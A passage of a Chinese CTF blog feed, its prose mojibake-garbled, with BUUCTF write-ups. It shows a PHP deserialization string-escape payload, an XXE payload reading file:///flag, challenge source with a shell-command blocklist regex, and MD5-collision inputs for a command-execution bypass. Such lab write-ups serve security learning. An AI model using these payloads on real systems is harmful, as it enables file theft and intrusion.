class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;è¿‡æ»¤å‡½æ•°</span><br><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€ƒâ€ƒè¿™é‡Œæ˜¯å°†â€™selectâ€™, â€˜insertâ€™, â€˜updateâ€™, â€˜deleteâ€™, â€˜whereâ€™æ›¿æ¢æˆâ€™hackerâ€™ï¼Œæˆ‘ä»¬å†™å…¥whereæ›¿æ¢æˆhackerä¹‹åå­—ç¬¦ä¸²å®é™…çš„é•¿åº¦å°±+1ï¼Œå› æ­¤å®é™…çš„é•¿åº¦å¤§äºåºåˆ—åŒ–å›ºå®šçš„é•¿åº¦ï¼ˆå˜é‡å‰é¢â€˜sâ€™é‡Œçš„å€¼ï¼‰ã€‚åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œååºåˆ—åŒ–æ—¶åªèƒ½å°†å­—ç¬¦ä¸²ä¸­nicknameå‰é¢çš„såé¢é•¿åº¦çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–æˆåŠŸï¼Œè¿™ä¸ªæ˜¯ä¼ å‚çš„æ—¶å€™å°±å›ºå®šå¥½äº†ã€‚å‰©ä¸‹çš„å­—ç¬¦ä¸²æˆ‘ä»¬æ„é€ æˆclass.phpå› ä¸ºé‡Œé¢åŒ…å«äº†flagï¼Œå¹¶ä¸”è®©ä»–åœ¨photoä½ç½®ä¸Šï¼Œç„¶åæŠŠphotoç»™æ‰”æ‰ï¼Œè¿™æ ·åœ¨profile.phpä¸­è¯»å–çš„photoå°±æ˜¯æˆ‘ä»¬æ„é€ çš„config.phpäº†ï¼Œä¹Ÿå°±æ˜¯è¯»å–åˆ°äº†flag<br>â€ƒâ€ƒç®€å•è¯´å°±æ˜¯åˆ©ç”¨åç«¯çš„å‡½æ•°æ›¿æ¢ï¼Œå¯¼è‡´å®é™…é•¿åº¦å¢åŠ ï¼Œå¢åŠ çš„éƒ¨åˆ†ï¼ˆconfig.phpï¼‰è¢«æŒ¤äº†å‡ºæ¥ï¼Œåˆ°äº†photoçš„ä½ç½®ä¸Šï¼Œç„¶åé—­åˆã€‚<br>â€ƒâ€ƒå†ä¸¾ä¸ªä¾‹æ–¹ä¾¿å¤§å®¶ç†è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$a &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>abcå‰é¢çš„s:3:ä¸å˜ï¼Œå› ä¸ºæ˜¯åºåˆ—åŒ–çš„æ—¶å€™å›ºå®šäº†<br>æˆ‘ä»¬å°†abcæ„é€ æˆï¼šabcâ€;i:2;s:5:â€qwertâ€;}æˆ‘ä»¬å†æœ€åæ„é€ äº†ä¸€ä¸ªé—­åˆï¼Œå¯¼è‡´defgè¢«ä¸¢å¼ƒï¼Œqwertå ç”¨äº†defgåŸæœ¬çš„ä½ç½®<br>â€ƒâ€ƒè¿˜æ˜¯å›åˆ°è¿™ä¸€é“é¢˜ä¸Šï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å°†â€;}s:5:â€photoâ€;s:10:â€config.phpâ€;}æ’å…¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é‡Œé¢å»ï¼Œè¿™ä¸ªçš„é•¿åº¦ä¸º34ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŒ¤å‡ºæ¥34ä½ï¼Œä¸ç„¶å°±æˆäº†nicknameçš„å€¼äº†ã€‚whereä¼šæ›¿æ¢æˆhackerï¼Œé•¿åº¦åŠ 1ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ„é€ 34ä¸ªwhereã€‚ç„¶åå»profile.phpæŸ¥çœ‹è¯»å–çš„å†…å®¹ã€‚</p><h5 id="è§£é¢˜ç»§ç»­"><a href="#è§£é¢˜ç»§ç»­" class="headerlink" title="è§£é¢˜ç»§ç»­"></a>è§£é¢˜ç»§ç»­</h5><p>nicknameä¼ å…¥ï¼Œå¹¶ä¸”nicknameè¦æ”¹æˆnickname[]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/17/buu/12/image-20210817203900289.png" alt="image-20210817203900289"></p><p>ä¸Šä¼ æˆåŠŸï¼Œå»è®¿é—®profile.php</p><p><img src="/2021/08/17/buu/12/image-20210817204106098.png" alt="image-20210817204106098"></p><hr><p><img src="/2021/08/17/buu/12/image-20210817204134202.png" alt="image-20210817204134202"></p><p>è§£ç ä¸€ä¸‹</p><p><img src="/2021/08/17/buu/12/image-20210817204228388.png" alt="image-20210817204228388"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯ 2020 æœ±é›€ç»„ phpweb&amp;NCTF2019 Fake XML cookbook</title>
      <link href="/2021/08/11/buu/11/"/>
      <url>/2021/08/11/buu/11/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00çŸ¥è¯†ç‚¹"><a href="#0x00çŸ¥è¯†ç‚¹" class="headerlink" title="0x00çŸ¥è¯†ç‚¹"></a>0x00çŸ¥è¯†ç‚¹</h3><p>XMLå¯èƒ½å­˜åœ¨çš„æ¼æ´:<br>XMLæ³¨å…¥å’ŒXPathæ³¨å…¥XML å¤–éƒ¨å®ä½“æ³¨å…¥</p><p><strong>ä»€ä¹ˆæ˜¯ XMLï¼Ÿ</strong><br>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚<br>XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚<br>XML æ˜¯ W3C çš„æ¨èæ ‡å‡†ã€‚<br>XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚<br>XML è¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾</p><p><strong>XXEæ”»å‡»</strong><br>é™„ä¸Šé“¾æ¥ï¼š</p><p><a href="https://xz.aliyun.com/t/6887**%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E">https://xz.aliyun.com/t/6887**ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´</a>**</p><p>XXE(XML External Entity Injection)å…¨ç§°ä¸ºXMLå¤–éƒ¨å®ä½“æ³¨å…¥</p><p><a href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><strong>æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´</strong></p><h3 id="0x01è§£é¢˜"><a href="#0x01è§£é¢˜" class="headerlink" title="0x01è§£é¢˜"></a>0x01è§£é¢˜</h3><h4 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„" class="headerlink" title="ç½‘é¼æ¯ 2020 æœ±é›€ç»„"></a>ç½‘é¼æ¯ 2020 æœ±é›€ç»„</h4><p><img src="/2021/08/11/buu/11/image-20210811193932874.png" alt="image-20210811193932874"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result &#x3D; call_user_func($func, $p);</span><br><span class="line">        $a&#x3D; gettype($result);</span><br><span class="line">        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func &#x3D; &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">    if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/buu/11/image-20210811194437549.png" alt="image-20210811194437549"></p><h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="NCTF2019 Fake XML cookbook"></a>NCTF2019 Fake XML cookbook</h4><p>è¿™é¢˜è§£é¢˜æŒºå¿«çš„ï¼Œæœ‰ç‚¹åƒä¹‹å‰çš„sqlæ³¨å…¥</p><p>è¿™æ¬¡æ˜¯è¿›è¡Œæ¶æ„å®ä½“æ³¨å…¥</p><p><img src="/2021/08/11/buu/11/image-20210812153137919.png" alt="image-20210812153137919"></p><p>å°è¯•adminï¼ŒæŠ“ä¸ªåŒ…</p><p><img src="/2021/08/11/buu/11/image-20210812153237740.png" alt="image-20210812153237740"></p><p>çœ‹åˆ°äº†POSTæäº¤æ•°æ®åçš„é¡µé¢</p><p>æˆ‘ä»¬æŸ¥çœ‹æ— è¾“å…¥æ•°æ®çš„é¡µé¢æºä»£ç </p><p>æ‰¾åˆ°å…³é”®ä»£ç æ®µ</p><p><img src="/2021/08/11/buu/11/image-20210812153441742.png" alt="image-20210812153441742"></p><pre><code>function doLogin()&#123;    var username = $(&quot;#username&quot;).val();    var password = $(&quot;#password&quot;).val();    if(username == &quot;&quot; || password == &quot;&quot;)&#123;        alert(&quot;Please enter the username and password!&quot;);        return;    &#125;var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax(&#123;    type: &quot;POST&quot;,    url: &quot;doLogin.php&quot;,    contentType: &quot;application/xml;charset=utf-8&quot;,    data: data,    dataType: &quot;xml&quot;,    anysc: false,    success: function (result) &#123;        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;        if(code == &quot;0&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);        &#125;else if(code == &quot;1&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);        &#125;else&#123;            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);        &#125;    &#125;,    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);    &#125;&#125;); &#125;</code></pre><p><strong>æ‘˜æŠ„ï¼š</strong></p><p><strong>XMLå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼š</strong><br>XMLæ³¨å…¥å’ŒXPathæ³¨å…¥XML å¤–éƒ¨å®ä½“æ³¨å…¥</p><p><strong>ä»€ä¹ˆæ˜¯ XMLï¼Ÿ</strong><br>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚<br>XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚<br>XML æ˜¯ W3C çš„æ¨èæ ‡å‡†ã€‚<br>XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚<br>XML è¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾</p><p><strong>XXEæ”»å‡»</strong><br>é™„ä¸Šé“¾æ¥ï¼š</p><p><a href="https://xz.aliyun.com/t/6887">https://xz.aliyun.com/t/6887</a></p><p>XXE(XML External Entity Injection)å…¨ç§°ä¸ºXMLå¤–éƒ¨å®ä½“æ³¨å…¥</p><p>Payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/buu/11/image-20210812154303323.png" alt="image-20210812154303323"></p><h6 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h6><p> <a href="https://blog.csdn.net/devilare/article/details/118969558">NCTF2019]Fake XML cookbook_devilareçš„åšå®¢-CSDNåšå®¢</a></p><p> <a href="https://blog.csdn.net/SopRomeo/article/details/105913611">NCTF2019]Fake XML cookbook_SopRomeoçš„åšå®¢-CSDNåšå®¢</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12323562.html">NCTF2019]Fake XML cookbook - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯ 2019 easy_web</title>
      <link href="/2021/08/08/buu/10/"/>
      <url>/2021/08/08/buu/10/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00çŸ¥è¯†ç‚¹"><a href="#0x00çŸ¥è¯†ç‚¹" class="headerlink" title="0x00çŸ¥è¯†ç‚¹"></a>0x00çŸ¥è¯†ç‚¹</h4><h5 id="MD5ç¢°æ’çš„ä¸€äº›ä¾‹å­"><a href="#MD5ç¢°æ’çš„ä¸€äº›ä¾‹å­" class="headerlink" title="MD5ç¢°æ’çš„ä¸€äº›ä¾‹å­"></a>MD5ç¢°æ’çš„ä¸€äº›ä¾‹å­</h5><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><h5 id="PHPä»£ç å®‰å…¨ã€PHPå¼±å£ä»¤ã€åŠ å¯†å‡½æ•°ã€ç»•è¿‡å‡½æ•°ã€‘-CTFä»£ç å®¡è®¡é¢˜"><a href="#PHPä»£ç å®‰å…¨ã€PHPå¼±å£ä»¤ã€åŠ å¯†å‡½æ•°ã€ç»•è¿‡å‡½æ•°ã€‘-CTFä»£ç å®¡è®¡é¢˜" class="headerlink" title="PHPä»£ç å®‰å…¨ã€PHPå¼±å£ä»¤ã€åŠ å¯†å‡½æ•°ã€ç»•è¿‡å‡½æ•°ã€‘/CTFä»£ç å®¡è®¡é¢˜"></a>PHPä»£ç å®‰å…¨ã€PHPå¼±å£ä»¤ã€åŠ å¯†å‡½æ•°ã€ç»•è¿‡å‡½æ•°ã€‘/CTFä»£ç å®¡è®¡é¢˜</h5><p><a href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p><h4 id="0x01è§£é¢˜"><a href="#0x01è§£é¢˜" class="headerlink" title="0x01è§£é¢˜"></a>0x01è§£é¢˜</h4><p>é¶æœºå¯åŠ¨ï¼š</p><p><img src="/2021/08/08/buu/10/image-20210809085159186.png" alt="image-20210809085159186"></p><p>è§‚å¯Ÿåˆ°urlè·¯å¾„å­˜åœ¨å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰è¿™é‡Œå°±æ˜¯åˆ‡å…¥ç‚¹ï¼ŒimgèƒŒåçš„ä¼¼ä¹æ˜¯base64ç </p><p>åœ¨çº¿è§£ç ä¸€ä¸‹ï¼ˆ<a href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/ï¼‰ï¼š</a></p><p>TXpVek5UTTFNbVUzTURabE5qYz0</p><p>MzUzNTM1MmU3MDZlNjc=</p><p>3535352e706e67</p><p>è¿ç»­ä¸¤æ¬¡base64è§£ç åï¼Œå¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²</p><p>æŸ¥äº†èµ„æ–™ï¼Œè¿™æ˜¯hexç¼–ç </p><p><img src="/2021/08/08/buu/10/image-20210809085725782.png" alt="image-20210809085725782"></p><p>å†æ¬¡è§£ç ï¼šå¾—åˆ°555.pngï¼Œæœ‰æ„æ€</p><p>åˆšå¥½é¶æœºé¡µé¢ä¸Šå°±æœ‰ä¸€å¼ å“­æ³£å›¾ç‰‡</p><p>æˆ‘ä»¬çŒœæµ‹ï¼Œimgåé¢çš„å¤šæ¬¡ç¼–ç çš„å‚æ•°è¯·æ±‚å¯ä»¥å¾—åˆ°æºç </p><p>æŒ‰ç…§ä¸Šé¢çš„è§£ç é€†æ¨ç¼–ç ï¼Œå¯ä»¥å¾—åˆ°</p><p>index.php:</p><p>696E6465782E706870</p><p>Njk2RTY0NjU3ODJFNzA2ODcw</p><p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p><p>å°†å‚æ•°ä¿®æ”¹</p><p><img src="/2021/08/08/buu/10/image-20210809090352667.png" alt="image-20210809090352667"></p><p>f12æŸ¥çœ‹</p><p><img src="/2021/08/08/buu/10/image-20210809090426959.png" alt="image-20210809090426959"></p><p>å¯¹base64è§£ç å¾—åˆ°æºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="ä»£ç å®¡è®¡ï¼š"><a href="#ä»£ç å®¡è®¡ï¼š" class="headerlink" title="ä»£ç å®¡è®¡ï¼š"></a>ä»£ç å®¡è®¡ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹cmdçš„å€¼è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤ï¼Œä¸€èˆ¬çš„låƒsæŒ‡ä»¤éƒ½ä¸å¯ä»¥ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">       echo &#96;$cmd&#96;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo (&quot;md5 is funny ~&quot;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯´æ˜æˆ‘ä»¬éœ€è¦POSTä¸¤ä¸ªå˜é‡ï¼šaå’Œb</p><p>å®ƒä»¬ä½œä¸ºå­—ç¬¦ä¸²æ—¶çš„å€¼å¼±æ¯”è¾ƒä¸ç›¸ç­‰ï¼Œmd5åŠ å¯†çš„å€¼å¼ºæ¯”è¾ƒè¦ç›¸ç­‰ï¼ˆ<strong>md5ç¢°æ’</strong>ï¼‰</p><p>è¿™é‡Œä¸å¤ªç†è§£ï¼Œæ‰€ä»¥å…ˆç›´æ¥æŠ„äº†wpçš„md5å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>POSTä¼ å‚</p><p>è¿™é‡Œæœ€å¥½ä¸è¦ç”¨hackbarï¼Œå› ä¸ºhackbarå¥½åƒä¼šæŠŠmd5å€¼å†ç¼–ç </p><p>ï¼ˆè¿™ä¸ªåœ°æ–¹å‘äº†æˆ‘å¥½ä¹…ï¼‰</p><p>åœ¨è¯·æ±‚åˆ°åŒ…åï¼Œç›´æ¥åœ¨bpé‡Œæ”¹åŒ…</p><p>åŸæ¥çš„GETè¯·æ±‚ç›´æ¥æ”¹æˆPOSTè¯·æ±‚</p><p><img src="/2021/08/08/buu/10/image-20210809092901502.png" 